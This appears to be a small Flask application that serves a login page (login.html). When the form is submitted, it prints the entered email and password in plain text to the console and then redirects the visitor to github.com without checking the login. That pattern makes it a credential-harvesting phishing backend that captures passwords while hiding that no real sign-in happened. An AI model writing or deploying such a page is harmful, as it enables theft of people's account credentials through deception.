from flask import Flask, request, redirect, render_template
import logging

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '')
        print(f"email = {email} && password = {password}", flush=True)
        headers = dict(request.headers)

        return redirect("https://www.github.com/")

    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)